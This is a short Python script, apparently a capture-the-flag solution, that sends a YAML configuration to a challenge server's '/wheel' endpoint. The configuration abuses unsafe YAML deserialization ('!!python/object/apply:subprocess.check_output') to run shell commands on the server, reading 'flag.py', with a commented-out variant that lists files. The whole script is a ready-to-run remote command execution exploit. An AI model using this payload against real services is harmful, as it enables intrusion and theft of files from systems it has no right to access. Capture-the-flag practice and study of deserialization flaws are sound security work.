import requests

url = 'http://chal.cybersecurityrumble.de:7780'
wheel_url = url + '/wheel'

# wheel_config = """name: !!python/object/apply:subprocess.check_output ['ls']
# image_num: 2
# diameter: 23
# """

wheel_config = """name: !!python/object/apply:subprocess.check_output [
!!python/object/new:list { listitems: ['cat', 'flag.py'] }
]
image_num: 2
diameter: 23
"""

payload = {
    'config': wheel_config
}

r = requests.post(wheel_url, data=payload)
print(r.text)
